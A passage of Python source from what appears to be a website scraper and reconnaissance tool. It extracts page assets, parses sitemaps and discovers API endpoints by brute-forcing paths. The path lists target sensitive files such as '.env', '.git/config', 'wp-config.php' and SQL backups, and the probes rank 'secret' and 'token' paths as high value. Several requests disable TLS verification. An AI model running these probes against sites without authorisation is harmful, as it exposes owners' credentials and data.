    shell=False (default) ဖြစ်တဲ့အတွက် shell injection မဖြစ်နိုင်
    """
    if not PUPPETEER_OK:
        return None

    # ── Subprocess injection fix ──────────────────
    safe, reason = is_safe_url(url)
    if not safe:
        logger.warning(f"Puppeteer blocked unsafe URL: {reason}")
        return None

    # Strict URL chars whitelist (extra layer)
    if not re.match(r'^https?://[a-zA-Z0-9\-._~:/?#\[\]@!$&\'()*+,;=%]+$', url):
        logger.warning("Puppeteer blocked URL with invalid characters")
        return None

    try:
        result = subprocess.run(
            ["node", JS_RENDER, url],  # list → no shell injection possible
            capture_output=True,
            timeout=45,
            text=True,
            shell=False                # explicit: False
        )
        if result.returncode == 0 and result.stdout.strip():
            return result.stdout
        logger.warning(f"Puppeteer stderr: {result.stderr[:100]}")
        return None
    except subprocess.TimeoutExpired:
        log_warn(url, "puppeteer timeout")
        return None
    except Exception as e:
        logger.warning(f"Puppeteer exception: {type(e).__name__}")
        return None

def _fetch_page_sync(url: str, use_js: bool = False) -> tuple:
    """Sync version — called via asyncio.to_thread()
    Improved: rotating UA headers, retry on 429/5xx, SSL fallback.
    """
    if use_js:
        html = fetch_with_puppeteer(url)
        if html:
            return html, True
        log_info(f"JS fallback to requests: {sanitize_log_url(url)}")

    session = requests.Session()
    _retry = Retry(total=3, backoff_factor=0.5, status_forcelist=[429, 500, 502, 503, 504])
    session.mount("http://",  HTTPAdapter(max_retries=_retry))
    session.mount("https://", HTTPAdapter(max_retries=_retry))

    try:
        resp = session.get(url, headers=_get_headers(), timeout=TIMEOUT,
                           allow_redirects=True, verify=True)
        resp.raise_for_status()
        ct = resp.headers.get('Content-Type', '')
        if not any(t in ct for t in ('text/html', 'application/xhtml', 'text/plain')):
            return None, False
        return resp.text, False
    except requests.exceptions.SSLError:
        try:
            resp = session.get(url, headers=_get_headers(), timeout=TIMEOUT,
                               allow_redirects=True, verify=False)
            resp.raise_for_status()
            return resp.text, False
        except Exception as e:
            log_warn(url, f"fetch error (ssl-fallback): {type(e).__name__}")
            return None, False
    except Exception as e:
        log_warn(url, f"fetch error: {type(e).__name__}")
        return None, False

def fetch_page(url: str, use_js: bool = False) -> tuple:
    """Returns: (html | None, js_used: bool)
    Bug fix: requests.get() ကို sync ဖြင့် run — event loop ကို မ block ဖို့
    async context ထဲမှာ asyncio.to_thread(fetch_page, url) ဖြင့် ခေါ်ပါ
    """
    return _fetch_page_sync(url, use_js)


# ══════════════════════════════════════════════════
# 🔍  ASSET EXTRACTORS
# ══════════════════════════════════════════════════

def extract_assets(html: str, page_url: str, soup=None) -> set:
    """Extract all asset URLs. Pass pre-parsed soup to avoid re-parsing."""
    if soup is None:
        soup = BeautifulSoup(html, _BS_PARSER)
    assets = set()

    # ── Standard links / scripts ──────────────────
    for tag in soup.find_all('link', href=True):
        assets.add(urljoin(page_url, tag['href']))
    for tag in soup.find_all('script', src=True):
        assets.add(urljoin(page_url, tag['src']))

    # ── Images (all lazy-load attrs) ──────────────
    LAZY_ATTRS = (
        'src','data-src','data-lazy','data-original','data-lazy-src',
        'data-srcset','data-original-src','data-hi-res-src',
        'data-full-src','data-image','data-img','data-bg',
        'data-background','data-poster','data-thumb',
    )
    for tag in soup.find_all('img'):
        for attr in LAZY_ATTRS:
            v = tag.get(attr, '')
            if v and not v.startswith('data:'):
                assets.add(urljoin(page_url, v))
        for part in tag.get('srcset', '').split(','):
            u = part.strip().split(' ')[0]
            if u: assets.add(urljoin(page_url, u))

    # ── Video / Audio / Media ─────────────────────
    for tag in soup.find_all(['video', 'audio', 'source', 'track']):
        for attr in ('src', 'data-src', 'poster'):
            v = tag.get(attr, '')
            if v: assets.add(urljoin(page_url, v))
    # <video> direct src
    for tag in soup.find_all('video', src=True):
        assets.add(urljoin(page_url, tag['src']))
    # iframe embeds (video players)
    for tag in soup.find_all('iframe', src=True):
        s = tag['src']
        if any(x in s for x in ('youtube','vimeo','player','embed','video')):
            assets.add(urljoin(page_url, s))

    # ── Downloadable files ────────────────────────
    FILE_EXTS = (
        '.pdf','.zip','.rar','.7z','.tar','.gz',
        '.doc','.docx','.xls','.xlsx','.ppt','.pptx',
        '.mp3','.mp4','.avi','.mkv','.mov','.webm',
        '.apk','.exe','.dmg','.iso',
    )
    for tag in soup.find_all('a', href=True):
        h = tag['href']
        full = urljoin(page_url, h)
        low  = full.lower().split('?')[0]
        if any(low.endswith(ext) for ext in FILE_EXTS):
            assets.add(full)

    # ── CSS inline / style tag ────────────────────
    for tag in soup.find_all(style=True):
        for u in _RE_CSS_URL.findall(tag['style']):
            if not u.startswith('data:'): assets.add(urljoin(page_url, u))
    for st in soup.find_all('style'):
        css = st.string or ''
        for u in _RE_CSS_URL.findall(css):
            if not u.startswith('data:'): assets.add(urljoin(page_url, u))
        for u in _RE_CSS_IMPORT.findall(css):
            assets.add(urljoin(page_url, u))

    # ── Meta tags (OG image etc) ──────────────────
    for tag in soup.find_all('meta'):
        prop = tag.get('property', '') + tag.get('name', '')
        if any(k in prop.lower() for k in ('image','thumbnail','banner','icon')):
            c = tag.get('content', '')
            if c.startswith('http'): assets.add(c)

    # ── Object / Embed ────────────────────────────
    for tag in soup.find_all(['object', 'embed']):
        v = tag.get('data', '') or tag.get('src', '')
        if v: assets.add(urljoin(page_url, v))

    # ── Regex sweep: static files in raw HTML/JS (pre-compiled) ──
    for m in _RE_URL_IN_HTML.finditer(html):
        u = m.group(1)
        if u.startswith('/'):
            u = urljoin(page_url, u)
        assets.add(u)

    # ── JSON-LD / structured data images ─────────
    for tag in soup.find_all('script', type='application/ld+json'):
        txt = tag.string or ''
        for m in _RE_JSONLD_IMG.finditer(txt):
            assets.add(m.group(1))

    return assets


def extract_css_assets(css: str, css_url: str) -> set:
    assets = set()
    for u in _RE_CSS_URL.findall(css):
        u = u.strip().strip('"\'')
        if u and not u.startswith('data:') and not u.startswith('#'):
            assets.add(urljoin(css_url, u))
    for u in _RE_CSS_IMPORT.findall(css):
        assets.add(urljoin(css_url, u))
    return assets


def extract_media_from_js(js_content: str, base_url: str) -> set:
    """
    Mine JS/JSON files for media URLs, webpack chunks, and asset paths.
    Useful for React/Vue/Next.js apps that store image paths in JS bundles.
    """
    assets = set()
    # Full URLs (http/https)
    for m in _RE_JS_FULL_URL.finditer(js_content):
        assets.add(m.group(1))
    # Relative paths (/static/media/... etc)
    for m in _RE_JS_REL_URL.finditer(js_content):
        u = m.group(1)
        if any(u.endswith(ext) for ext in (
            '.js','.css','.png','.jpg','.jpeg','.gif','.webp','.avif',
            '.svg','.woff','.woff2','.ttf','.otf','.eot',
            '.mp4','.webm','.mp3','.ogg','.pdf',
        )):
            assets.add(urljoin(base_url, u))

    # Webpack chunk names: chunkFilename: "[name].[hash].js"
    _RE_WEBPACK = re.compile(r'["\']([a-f0-9]{8,}\.[a-z]+\.js)["\']')
    origin = f"{urlparse(base_url).scheme}://{urlparse(base_url).netloc}"
    for m in _RE_WEBPACK.finditer(js_content):
        assets.add(f"{origin}/static/js/{m.group(1)}")

    # Next.js /_next/static chunks
    _RE_NEXT = re.compile(r'/_next/static/[^\s"\'<>]+')
    for m in _RE_NEXT.finditer(js_content):
        assets.add(urljoin(base_url, m.group(0)))

    return assets


# ══════════════════════════════════════════════════
# 🗺️  SITEMAP PARSER
# ══════════════════════════════════════════════════

def fetch_sitemap(base_url: str) -> set:
    """
    Fetch sitemap.xml (and sitemap index) — returns all page URLs.
    Supports: /sitemap.xml, /sitemap_index.xml, /robots.txt discovery
    """
    urls   = set()

    def _fetch_one_sitemap(url: str, depth: int = 0):
        if depth > 3:   # FIX: recursion depth limit
            return
        try:
            r = requests.get(url, headers=_get_headers(), timeout=15, verify=False)
            if r.status_code != 200:
                return
            text = r.text
            # Sitemap index → recurse
            if '<sitemapindex' in text:
                for m in _RE_SITEMAP_LOC.finditer(text):
                    sub = m.group(1).strip()
                    if sub not in urls:
                        _fetch_one_sitemap(sub, depth + 1)
            else:
                for m in _RE_SITEMAP_LOC.finditer(text):
                    urls.add(m.group(1).strip())
        except Exception as _e:
            logging.debug("Scan error: %s", _e)

    # Try common sitemap locations
    parsed = urlparse(base_url)
    root   = f"{parsed.scheme}://{parsed.netloc}"

    # Check robots.txt for sitemap pointer first
    try:
        r = requests.get(f"{root}/robots.txt", headers=HEADERS,
                         timeout=8, verify=False)
        if r.status_code == 200:
            for m in _RE_ROBOTS_SM.finditer(r.text):
                _fetch_one_sitemap(m.group(1).strip())
    except Exception as _e:
        logging.debug("Scan error: %s", _e)

    if not urls:
        for path in ['/sitemap.xml', '/sitemap_index.xml',
                     '/sitemap/sitemap.xml', '/wp-sitemap.xml',
                     '/news-sitemap.xml', '/post-sitemap.xml',
                     '/page-sitemap.xml', '/product-sitemap.xml']:
            _fetch_one_sitemap(root + path)

    # Filter to same domain only
    netloc = parsed.netloc
    return {u for u in urls if urlparse(u).netloc == netloc}


# ══════════════════════════════════════════════════
# 🔌  API ENDPOINT DISCOVERY
# ══════════════════════════════════════════════════

# Common API paths for e-commerce + news/blog sites
_API_PATHS_ECOMMERCE = [
    '/api/login', '/api/v1/products', '/api/v2/products', '/api/v3/products',
    '/api/categories', '/api/v1/categories', '/api/v2/categories',
    '/api/items', '/api/inventory', '/api/v1/inventory',
    '/api/cart', '/api/orders', '/api/v1/orders', '/api/v2/orders',
    '/api/checkout', '/api/payments', '/api/shipping', '/api/delivery',
    '/api/search', '/api/v1/search', '/api/v2/search',
    '/api/users', '/api/v1/users', '/api/v2/users', '/api/customers',
    '/api/config', '/api/settings', '/api/v1/settings',
    '/api/reviews', '/api/v1/reviews', '/api/ratings',
    '/api/wishlist', '/api/favorites', '/api/v1/favorites',
    '/api/coupons', '/api/discounts', '/api/promotions',
    '/api/stock', '/api/variants', '/api/attributes',
    '/wp-json/wc/v3/products', '/wp-json/wc/v3/categories',
    '/wp-json/wc/v3/orders', '/wp-json/wc/v3/customers',
    '/wp-json/wc/v3/coupons', '/wp-json/wc/v3/reports',
    '/wp-json/wc/v3/settings', '/wp-json/wc/v3/shipping_zones',
    '/wp-json/wc/v2/products', '/wp-json/wc/v2/orders',
    '/wp-json/wc/v2/customers', '/wp-json/wc/v2/coupons',
    '/rest/V1/products', '/rest/V1/categories', '/rest/V1/orders',
    '/rest/default/V1/products', '/rest/V1/customers',
    '/rest/V1/cmsPage', '/rest/V1/search',
    '/graphql', '/api/graphql', '/v1/graphql', '/graphql/schema.json',
    '/graphql/playground', '/graphql/console',
    '/products.json', '/collections.json', '/pages.json',
    '/collections/all/products.json', '/admin/api/2023-10/products.json',
    '/cart.js', '/recommendations/products.json', '/search/suggest.json',
    '/api/products', '/api/categories', '/api/customers',
    '/api', '/api/v1', '/api/v2', '/api/v3', '/api/v4',
    '/rest/v1', '/rest/api', '/rest/v2',
]

_API_PATHS_NEWS = [
    '/wp-json/wp/v2/posts', '/wp-json/wp/v2/pages',
    '/wp-json/wp/v2/categories', '/wp-json/wp/v2/tags',
    '/wp-json/wp/v2/media', '/wp-json/wp/v2/users', '/wp-json',
    '/wp-json/wp/v2/comments', '/wp-json/wp/v2/types',
    '/wp-json/wp/v2/taxonomies', '/wp-json/wp/v2/settings',
    '/api/articles', '/api/posts', '/api/news', '/api/blogs',
    '/api/v1/articles', '/api/v1/posts', '/api/v2/posts',
    '/api/content', '/api/v1/content', '/api/stories',
    '/api/feed', '/feed.json', '/feed/json',
    '/rss', '/rss.xml', '/feed', '/feed.rss', '/rss/feed',
    '/atom.xml', '/sitemap.xml', '/sitemap_index.xml', '/sitemap-news.xml',
    '/sitemap-posts.xml', '/sitemap-pages.xml',
    '/ghost/api/v4/content/posts/', '/ghost/api/v3/content/posts/',
    '/ghost/api/v4/content/pages/', '/ghost/api/v4/admin/posts/',
    '/api/articles?populate=*', '/api/posts?populate=*',
    '/api/categories?populate=*', '/api/pages?populate=*',
    '/jsonapi/node/article', '/jsonapi/node/page',
    '/jsonapi/taxonomy_term/tags',
    '/api/entries', '/api/assets',
]

_API_PATHS_GENERAL = [
    '/api/health', '/api/status', '/health', '/ping', '/healthcheck',
    '/version', '/api/version', '/info', '/api/info', '/alive',
    '/api/ping', '/api/alive', '/status.json', '/health.json',
    '/.well-known/openapi.json', '/openapi.json', '/openapi.yaml',
    '/swagger.json', '/swagger.yaml', '/api-docs', '/swagger-ui.html',
    '/docs', '/api/docs', '/redoc', '/api/redoc',
    '/swagger', '/swagger/index.html', '/swagger-ui', '/api-documentation',
    '/.well-known/security.txt', '/.well-known/core-config',
    '/.well-known/host-meta', '/.well-known/webfinger',
    '/.env', '/.env.local', '/.env.production', '/.env.development',
    '/config.json', '/app.json', '/manifest.json', '/config.yaml',
    '/appsettings.json',
    '/debug', '/debug/info', '/phpinfo.php', '/info.php',
    '/server-status', '/server-info', '/trace',
    '/metrics', '/metrics.json', '/prometheus',
    '/actuator', '/actuator/health', '/actuator/info', '/actuator/metrics',
    '/actuator/env', '/actuator/mappings', '/actuator/beans',
]

_API_PATHS_AUTH = [
    '/api/login', '/api/v1/login', '/api/auth', '/api/v1/auth',
    '/api/auth/login', '/api/users/login', '/api/admin/login',
    '/api/register', '/api/v1/register', '/api/auth/register', '/api/signup',
    '/api/token', '/api/v1/token', '/oauth/token', '/oauth2/token',
    '/api/refresh', '/api/token/refresh', '/api/auth/refresh',
    '/api/me', '/api/v1/me', '/api/user', '/api/current_user',
    '/api/logout', '/api/auth/logout', '/api/auth/signout',
    '/wp-json/jwt-auth/v1/token', '/wp-json/aam/v2/authenticate',
    '/api/forgot-password', '/api/reset-password', '/api/verify-email',
    '/api/auth/google', '/api/auth/facebook', '/api/auth/github',
    '/api/auth/callback', '/api/auth/token', '/api/auth/user',
    '/api/sessions', '/api/v1/sessions',
    '/auth/login', '/auth/register', '/auth/token', '/auth/refresh',
    '/user/login', '/user/register', '/users/sign_in', '/users/sign_up',
]

_API_PATHS_ADMIN = [
    '/api/admin', '/api/v1/admin', '/admin/api',
    '/api/dashboard', '/api/system', '/api/config', '/api/settings',
    '/api/admin/users', '/api/admin/settings', '/api/admin/stats',
    '/admin/dashboard.json', '/api/stats', '/api/metrics',
    '/api/admin/logs', '/api/admin/audit', '/api/admin/reports',
    '/manage/health', '/manage/info', '/manage/metrics',
    '/admin/api/v1', '/admin/api/v2',
    '/api/roles', '/api/permissions', '/api/policies',
]

_API_PATHS_MOBILE = [
    '/api/v1/app', '/api/v2/app', '/api/mobile',
    '/api/v1/config', '/api/v2/config', '/api/app-config',
    '/api/notifications', '/api/v1/notifications', '/api/v2/notifications',
    '/api/v1/feed', '/api/v2/feed', '/api/timeline',
    '/api/social', '/api/friends', '/api/followers', '/api/following',
    '/api/messages', '/api/v1/messages', '/api/conversations', '/api/chat',
    '/api/upload', '/api/media', '/api/files', '/api/images',
    '/api/analytics', '/api/events', '/api/tracking',
    '/api/push', '/api/push-notifications', '/api/fcm',
    '/api/location', '/api/v1/location', '/api/geo',
    '/api/profile', '/api/v1/profile', '/api/v2/profile',
    '/api/devices', '/api/v1/devices',
]

_API_PATHS_FINANCE = [
    '/api/payments', '/api/v1/payments', '/api/transactions',
    '/api/wallet', '/api/balance', '/api/withdraw', '/api/deposit',
    '/api/exchange', '/api/rates', '/api/currency',
    '/api/invoice', '/api/billing', '/api/subscriptions',
    '/api/v1/subscriptions', '/api/plans', '/api/pricing',
    '/api/crypto', '/api/coins', '/api/market',
    '/api/accounts', '/api/v1/accounts', '/api/v2/accounts',
    '/api/ledger', '/api/transfers', '/api/refunds',
]

_API_PATHS_SAAS = [
    '/api/workspaces', '/api/projects', '/api/teams',
    '/api/members', '/api/invitations', '/api/roles',
    '/api/reports', '/api/exports', '/api/imports',
    '/api/webhooks', '/api/integrations', '/api/plugins',
    '/api/audit', '/api/logs', '/api/activity',
    '/api/csrf-cookie', '/api/user', '/sanctum/csrf-cookie',
    '/oauth/authorize', '/oauth/clients', '/oauth/personal-access-tokens',
    '/api/schema/', '/api/schema/swagger-ui/', '/api/schema/redoc/',
    '/docs', '/redoc', '/openapi.json',
    '/api/_next', '/api/auth/session', '/api/auth/csrf', '/api/auth/providers',
    '/rest/v1/', '/auth/v1/', '/storage/v1/',
    '/api/organizations', '/api/billing', '/api/usage',
    '/api/tags', '/api/labels',
    '/api/search', '/api/autocomplete',
    '/api/comments', '/api/reactions', '/api/likes',
]

_API_PATHS_FRAMEWORK = [
    '/api/sanctum/csrf-cookie', '/api/broadcasting/auth',
    '/telescope/api/requests', '/telescope/api/commands',
    '/horizon/api/jobs/pending', '/horizon/api/stats',
    '/api/v1/schema/', '/admin/jsi18n/',
    '/rails/info/properties', '/rails/info/routes',
    '/env', '/beans', '/dump', '/mappings',
    '/configprops', '/autoconfig',
    '/jolokia', '/jolokia/list', '/jolokia/version',
    '/api-docs.json', '/explorer', '/loopback/api',
    '/api/values', '/api/weatherforecast',
    '/__/firebase/init.js', '/__/firebase/init.json',
    '/healthz', '/readyz',
]

_API_PATHS_BACKUP_CONFIG = [
    '/backup.zip', '/backup.sql', '/dump.sql', '/db.sql',
    '/database.sql', '/site.zip',
    '/.git/config', '/.git/HEAD', '/.git/FETCH_HEAD',
    '/.svn/entries', '/.svn/wc.db',
    '/composer.json', '/package.json', '/yarn.lock',
    '/requirements.txt', '/Gemfile',
    '/.DS_Store',
    '/crossdomain.xml', '/clientaccesspolicy.xml',
    '/humans.txt', '/robots.txt', '/ads.txt',
    '/CHANGELOG.md', '/README.md',
    '/wp-config.php', '/config/database.yml',
    '/storage/logs/laravel.log',
]

ALL_API_PATHS = list(dict.fromkeys(
    _API_PATHS_ECOMMERCE    +
    _API_PATHS_NEWS         +
    _API_PATHS_GENERAL      +
    _API_PATHS_AUTH         +
    _API_PATHS_ADMIN        +
    _API_PATHS_MOBILE       +
    _API_PATHS_FINANCE      +
    _API_PATHS_SAAS         +
    _API_PATHS_FRAMEWORK    +
    _API_PATHS_BACKUP_CONFIG
))


# ── API URL patterns in JS bundles ─────────────
_JS_API_PATTERNS = [
    re.compile(r"""(?:fetch|axios\.(?:get|post|put|delete|patch))\s*\(\s*['"`]([^'"`\s]{5,200})['"`]"""),
    re.compile(r"""(?:url|endpoint|baseURL|apiUrl|API_URL|baseUrl|apiBase|BASE_URL|API_BASE)\s*[:=]\s*['"`]([^'"`\s]{5,200})['"`]"""),
    re.compile(r"""['"`](/api/[^\s'"`\?#]{3,100})['"`]"""),
    re.compile(r"""['"`](/rest/[^\s'"`\?#]{3,100})['"`]"""),
    re.compile(r"""['"`](/v\d+/[^\s'"`\?#]{3,100})['"`]"""),
    re.compile(r"['\"`](https?://[^\s'\"` ]{10,200}/api/[^\s'\"` ?#]{2,100})['\"`]"),
    re.compile(r"""['"`](/graphql[^\s'"`\?#]{0,50})['"`]"""),
    re.compile(r"""['"`](/api/[a-zA-Z0-9_\-/]{2,80})['"`]"""),
    re.compile(r"""(wss?://[^\s'"` ]{5,200})"""),
    re.compile(r"""['"`](https://[a-z0-9]+\.supabase\.co/[^\s'"` ]{5,100})['"`]"""),
    re.compile(r"""['"`](/internal/[^\s'"`\?#]{3,80})['"`]"""),
    re.compile(r"""['"`](/private/[^\s'"`\?#]{3,80})['"`]"""),
    # V24: More patterns
    re.compile(r"""['"`](/admin/[^\s'"`\?#]{3,80})['"`]"""),
    re.compile(r"""['"`](/wp-json/[^\s'"`\?#]{3,100})['"`]"""),
    re.compile(r"""['"`](/jsonapi/[^\s'"`\?#]{3,100})['"`]"""),
    re.compile(r"""['"`](/socket\.io[^\s'"`\?#]{0,50})['"`]"""),
    re.compile(r"""(?:path|route|href|to)\s*[:=]\s*['"`]([/][a-zA-Z0-9_\-/]{3,80})['"`]"""),
    re.compile(r"""process\.env\.[A-Z_]+\s*[||=]+\s*['"`]([^'"`\s]{5,150})['"`]"""),
    re.compile(r"""REACT_APP_[A-Z_]+\s*[:=]\s*['"`]([^'"`\s]{5,150})['"`]"""),
    re.compile(r"""NEXT_PUBLIC_[A-Z_]+\s*[:=]\s*['"`]([^'"`\s]{5,150})['"`]"""),
    re.compile(r"""VUE_APP_[A-Z_]+\s*[:=]\s*['"`]([^'"`\s]{5,150})['"`]"""),
    re.compile(r"""['"`](/sse/[^\s'"`\?#]{2,60})['"`]"""),
    re.compile(r"""['"`](/stream/[^\s'"`\?#]{2,60})['"`]"""),
    re.compile(r"""['"`](/events/[^\s'"`\?#]{2,60})['"`]"""),
]

def _extract_api_urls_from_js(js_text: str, base_root: str) -> list:
    """JS bundle/source ထဲက API URL တွေ mine လုပ်"""
    found = set()
    for pat in _JS_API_PATTERNS:
        for m in pat.findall(js_text):
            url = m.strip()
            if not url or len(url) < 4:
                continue
            if url.startswith('/'):
                url = base_root + url
            if url.startswith('http') and '/api/' not in url and '/rest/' not in url and '/v' not in url:
                continue
            if url.startswith('http') or url.startswith('/'):
                found.add(url)
    return list(found)


def _extract_api_urls_from_html(html: str, base_root: str) -> list:
    """HTML source ထဲက API references mine လုပ်"""
    found = set()
    soup  = BeautifulSoup(html, 'html.parser')

    # data-* attributes
    for tag in soup.find_all(True):
        for attr, val in tag.attrs.items():
            if isinstance(val, str) and ('/api/' in val or '/rest/' in val):
                if val.startswith('/') or val.startswith('http'):
                    url = (base_root + val) if val.startswith('/') else val
                    found.add(url.split('?')[0])

    # Inline scripts
    for script in soup.find_all('script'):
        if script.string:
            for url in _extract_api_urls_from_js(script.string, base_root):
                found.add(url.split('?')[0])

    # <link rel="..."> and <a href="..."> with /api/
    for tag in soup.find_all(['link', 'a'], href=True):
        href = tag['href']
        if '/api/' in href or '/graphql' in href:
            url = (base_root + href) if href.startswith('/') else href
            found.add(url.split('?')[0])

    return list(found)


def _mine_js_bundles(html: str, root: str, proxies) -> list:
    """External JS files တွေ download ပြီး API URLs ထုတ် — V24: 50 bundles × 16 workers"""
    soup = BeautifulSoup(html, 'html.parser')
    js_urls = []
    seen_js = set()
    for tag in soup.find_all('script', src=True):
        src = tag['src']
        if not src: continue
        if src.startswith('//'):
            src = 'https:' + src
        elif src.startswith('/'):
            src = root + src
        # V24: include ALL .js files from this domain
        if src.startswith('http') and src not in seen_js:
            if src.endswith('.js') or any(kw in src.lower() for kw in (
                'chunk', 'bundle', 'main', 'app', 'vendor', 'index',
                'runtime', 'polyfill', 'pages', 'component', 'init',
                'config', 'api', 'service', 'util', 'helper', 'module',
                'store', 'router', 'layout', 'view', 'action', 'reducer',
            )):
                js_urls.append(src)
                seen_js.add(src)

    # V24: probe common bundle paths not found in HTML
    _COMMON_BUNDLE_PATHS = [
        '/static/js/main.js', '/assets/js/app.js', '/js/app.js',
        '/dist/bundle.js', '/build/static/js/main.chunk.js',
        '/_next/static/chunks/main.js', '/nuxt/dist/client/app.js',
        '/assets/index.js', '/public/app.js', '/js/index.js',
        '/static/bundle.js', '/dist/app.js', '/js/bundle.js',
    ]
    for bp in _COMMON_BUNDLE_PATHS:
        full = root + bp
        if full not in seen_js:
            js_urls.append(full)
            seen_js.add(full)

    found = set()
    def _fetch_js(js_url):
        try:
            r = requests.get(js_url, headers=HEADERS, timeout=12, verify=False)
            if r.status_code == 200 and len(r.text) > 100:
                return _extract_api_urls_from_js(r.text, root)
        except Exception as _e:
            logging.debug("Scan error: %s", _e)
        return []

    with concurrent.futures.ThreadPoolExecutor(max_workers=16) as ex:   # 8 → 16
        futs = {ex.submit(_fetch_js, u): u for u in js_urls[:50]}       # 20 → 50
        try:
            for fut in concurrent.futures.as_completed(futs, timeout=45):
                try:
                    for url in fut.result(timeout=8):
                        found.add(url.split('?')[0])
                except Exception:
                    pass
        except concurrent.futures.TimeoutError:
            for f in futs: f.cancel()

    return list(found)


def _check_robots_and_sitemap(root: str, proxies) -> list:
    """robots.txt / sitemap.xml ထဲက API paths ရှာ"""
    found = set()
    # robots.txt — Disallow paths with /api/
    try:
        r = requests.get(root + '/robots.txt', headers=HEADERS,
                         timeout=8, verify=False)
        if r.status_code == 200:
            for line in r.text.splitlines():
                line = line.strip()
                if line.lower().startswith(('disallow:', 'allow:')):
                    path = line.split(':', 1)[1].strip()
                    if any(kw in path for kw in ['/api/', '/rest/', '/v1/', '/v2/', '/graphql']):
                        found.add(root + path.split('*')[0].rstrip('$'))
    except Exception as _e:
        logging.debug("Scan error: %s", _e)
    return list(found)


def discover_api_endpoints(base_url: str, progress_cb=None) -> dict:
    """
    Comprehensive API discovery with CMS-aware path prioritization.
    1. SiteProfile → reorder paths by detected CMS
    2. HTML source mining
    3. JS bundle mining
    4. robots.txt discovery
    5. CORS header detection
    """
    parsed  = urlparse(base_url)
    root    = f"{parsed.scheme}://{parsed.netloc}"

    # ── Reuse or build SiteProfile ────────────────
    domain  = parsed.netloc
    profile = _PROFILE_CACHE.get(domain) or detect_site_profile(base_url)

    # ── Profile-aware path ordering ──────────────
    # Put CMS-specific paths first so results appear faster
    if profile.is_wordpress:
        priority = _API_PATHS_NEWS + list(_API_PATHS_GENERAL)
        rest     = [p for p in ALL_API_PATHS if p not in priority]
        ordered_paths = priority + rest
        api_workers   = 8 if not (profile.is_cloudflare or profile.has_waf) else 4
        probe_delay   = 0.15 if profile.is_cloudflare else 0.0
        if progress_cb:
            progress_cb("📝 *WordPress detected* — WP/WooCommerce paths first")
    elif profile.is_shopify:
        priority = [
            '/products.json', '/collections.json', '/pages.json',
            '/collections/all/products.json',
            '/admin/api/2023-10/products.json',
            '/cart.js', '/recommendations/products.json',
        ] + list(_API_PATHS_GENERAL)
        rest     = [p for p in ALL_API_PATHS if p not in priority]
        ordered_paths = priority + rest
        api_workers   = 6
        probe_delay   = 0.2
        if progress_cb:
            progress_cb("🛍️ *Shopify detected* — Shopify API paths first")
    elif profile.is_spa:
        priority = [
            '/api/graphql', '/graphql', '/api/v1', '/api/v2',
            '/api/auth', '/api/me', '/api/config',
        ] + list(_API_PATHS_GENERAL)
        rest     = [p for p in ALL_API_PATHS if p not in priority]
        ordered_paths = priority + rest
        api_workers   = 12
        probe_delay   = 0.0
        if progress_cb:
            progress_cb("⚛️ *SPA detected* — GraphQL/REST paths first")
    elif profile.is_cloudflare or profile.has_waf:
        ordered_paths = list(ALL_API_PATHS)
        api_workers   = 5
        probe_delay   = 0.3
        if progress_cb:
            progress_cb("☁️ *Cloudflare/WAF detected* — slow scan mode")
    else:
        ordered_paths = list(ALL_API_PATHS)
        api_workers   = 15
        probe_delay   = 0.0

    # ── Phase 0: Fetch homepage for mining ───────
    homepage_html = None
    try:
        r0 = requests.get(base_url, headers=HEADERS, timeout=12, verify=False)
        if r0.status_code == 200:
            homepage_html = r0.text
    except Exception as _e:
        logging.debug("Scan error: %s", _e)

    # ── Phase 1: HTML + JS mining (parallel) ─────
    html_mined = []
    js_mined   = []
    robots_found = []

    if homepage_html:
        if progress_cb: progress_cb("🔍 HTML source mining...")
        html_mined = _extract_api_urls_from_html(homepage_html, root)

        if progress_cb: progress_cb("📦 JS bundle mining...")
        js_mined   = _mine_js_bundles(homepage_html, root, None)

    if progress_cb: progress_cb("🤖 robots.txt scanning...")
    robots_found = _check_robots_and_sitemap(root, None)

    # ── Phase 2: Path brute-force ─────────────────
    found  = []
    seen   = set()

    def _probe(path: str) -> dict | None:
        url = root + path if path.startswith('/') else path
        try:
            r = requests.get(
                url,
                headers={**HEADERS, 'Accept': 'application/json, text/plain, */*'},
                timeout=7, verify=False,
                allow_redirects=True
            )
            ct   = r.headers.get('Content-Type', '')
            cors = r.headers.get('Access-Control-Allow-Origin', '')
            cors_methods = r.headers.get('Access-Control-Allow-Methods', '')
            server = r.headers.get('Server', '')
            powered = r.headers.get('X-Powered-By', '')
            size = len(r.content)

            # ── Risk score: high-value path detection ──
            risk = 0
            path_lower = path.lower()
            _HIGH_VALUE = ("admin","config","secret","credential","password","token",
                           "key","backup","dump","sql","env","private","internal",
                           "debug","actuator","graphql","swagger","openapi")
            for kw in _HIGH_VALUE:
                if kw in path_lower:
                    risk += 20
                    break

            endpoint = {
                "url":    url,
                "status": r.status_code,
                "cors":   cors if cors else None,
                "cors_methods": cors_methods if cors_methods else None,
                "server": server if server else None,
                "powered_by": powered if powered else None,
                "size_b": size,
                "preview": "",
                "type":   "OTHER",
                "method": "GET",
                "risk":   risk,
            }

            if r.status_code in (401, 403):
                endpoint["type"] = "PROTECTED"
                endpoint["risk"] += 15
                # Try OPTIONS to see allowed methods
                try:
                    opts = requests.options(url, headers=_get_headers(), timeout=4, verify=False)
                    allow = opts.headers.get('Allow', '') or opts.headers.get('Access-Control-Allow-Methods', '')
                    if allow:
                        endpoint["note"] = f"Allow: {allow[:60]}"
                        # PUT/PATCH/DELETE in allowed methods = high risk
                        if any(m in allow.upper() for m in ("PUT","PATCH","DELETE")):
                            endpoint["risk"] += 25
                            endpoint["note"] += " ⚠️WRITE"
                except Exception:
                    pass
                return endpoint

            if r.status_code == 405:   # Method Not Allowed → endpoint exists, try POST
                endpoint["type"] = "PROTECTED"
                endpoint["note"] = "GET not allowed"
                try:
                    pr = requests.post(url, json={}, headers={**_get_headers(), 'Content-Type': 'application/json'},
                                       timeout=5, verify=False)
                    if pr.status_code not in (404, 410):
                        endpoint["note"] = f"POST:{pr.status_code}"
                        if pr.status_code == 200:
                            endpoint["method"] = "POST"
                            body_p = pr.text[:150].strip()
                            if body_p.startswith(('{', '[')):
                                endpoint["type"]    = "JSON_API"
                                endpoint["preview"] = body_p
                except Exception:
                    pass
                return endpoint

            if r.status_code in (301, 302, 307, 308):
                loc = r.headers.get('Location', '')
                if loc and 'swagger' in loc.lower():
                    endpoint["type"]  = "API_DOCS"
                    endpoint["note"]  = f"→ {loc[:60]}"
                    return endpoint

            if r.status_code == 200 and size > 5:
                body = r.text[:500].strip()

                # Source map detection
                if path.endswith('.map') or url.endswith('.map'):
                    endpoint["type"]    = "SOURCE_MAP"
                    endpoint["preview"] = body[:80]
